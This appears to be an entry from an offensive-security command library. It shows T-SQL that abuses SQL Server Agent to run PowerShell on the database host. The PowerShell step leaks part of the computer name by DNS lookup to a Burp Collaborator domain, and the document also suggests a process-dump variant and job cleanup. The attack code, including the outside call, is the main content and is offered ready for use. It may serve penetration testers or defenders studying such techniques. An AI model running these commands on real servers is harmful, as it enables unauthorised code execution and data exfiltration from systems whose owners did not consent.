---
type: command
executor: sql
data: >-
  USE msdb; 

  EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; 

  EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name =
  N'test_powershell_name1', @subsystem = N'PowerShell', @command =
  N'$name=$env:COMPUTERNAME[10];nslookup "$name.redacted.burpcollaborator.net"',
  @retry_attempts = 1, @retry_interval = 5 ;

  EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; 

  EXEC dbo.sp_start_job N'test_powershell_job1';


  -- delete

  EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';
output: null
tags:
  - sql-agent
  - powershell-execution
platforms:
  - Windows
  - SQL Server
verified: true
validated: true
---

# Create PowerShell Job and Execute Nslookup Command

## Command

```sql
USE msdb; 
EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; 
EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup "$name.redacted.burpcollaborator.net"', @retry_attempts = 1, @retry_interval = 5 ;
EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; 
EXEC dbo.sp_start_job N'test_powershell_job1';

-- delete
EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';
```

## Description

This T-SQL command sequence creates a SQL Server Agent Job with a PowerShell subsystem step to execute an nslookup command for network reconnaissance. It targets the msdb system database, adds the job and step, assigns it to the local server, starts execution, and cleans up by deleting the job. Use this in a connected SQL session (e.g., via SSMS or sqlcmd) to run PowerShell on the SQL host.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| @job_name | Name of the job to create (e.g., N'test_powershell_job1') | Yes |
| @step_name | Name of the job step (e.g., N'test_powershell_name1') | Yes |
| @subsystem | Subsystem for the step (N'PowerShell' for PS execution) | Yes |
| @command | PowerShell code to execute (e.g., nslookup with env var) | Yes |
| @retry_attempts | Number of retries on failure (e.g., 1) | No |
| @retry_interval | Seconds between retries (e.g., 5) | No |

## Examples

### Basic Usage

Run the full sequence to create, execute, and delete a job performing nslookup.

### Advanced Usage

Modify @command for other PS code, e.g., N'Get-Process | Out-File C:\temp\proc.txt' to dump processes.

## Expected Output

No direct output from the EXEC statements, but successful job creation returns affected row counts (e.g., '1 row(s) affected'). Verify execution in job history: SELECT * FROM msdb.dbo.sysjobhistory WHERE job_id = (SELECT job_id FROM msdb.dbo.sysjobs WHERE name = 'test_powershell_job1'); Look for run_status = 1 (succeeded) and message column showing nslookup results like 'Server: dns-server.example.com Address: 192.168.1.1 Non-authoritative answer: Name: hostname.redacted.burpcollaborator.net'.

## Related

- [[procedures/sql-agent-job-powershell-execution]]
- [[codes/create-sql-agent-job-with-powershell-step]]
